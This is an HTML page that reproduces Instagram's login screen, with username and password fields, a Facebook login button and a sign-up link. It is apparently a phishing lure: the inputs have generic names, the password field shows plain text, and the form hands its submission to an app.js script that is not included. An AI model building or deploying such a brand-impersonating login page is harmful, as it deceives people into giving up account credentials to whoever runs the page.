<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>Instagram</title>
</head>
<body>

    
    <div class="container">
      <div class="box">
        <div class="heading"></div>
        <form class="login-form" id="dataForm">
          <div class="field">
            <input
            id="field1" 
            name="field1"
              type="name"
              placeholder="Phone number, username, or email"
            />
            <label for="field1">Phone number, username, or email</label>
          </div>
          <div class="field">
            <input id="field2" name="field2" type="text"  placeholder="password" />
            <label for="password">Password</label>
          </div>
            <button class="login-button" type="submit" title="login">Log In</button>
            <div class="separator">
              <div class="line"></div>
              <p>OR</p>
              <div class="line"></div>
            </div>
          <div class="other">
            <button class="fb-login-btn" type="button">
              <i class="fa fa-facebook-official fb-icon"></i>
              <span class="">Log in with Facebook</span>
            </button>
            <a class="forgot-password" href="#">Forgot password?</a>
          </div>
        </form>
      </div>
      <div class="box">
        <p>Don't have an account? <a class="signup" href="#">Sign Up</a></p>
      </div>
    </div>

    
    <script type="module" src="app.js"></script>
</body>
</html>
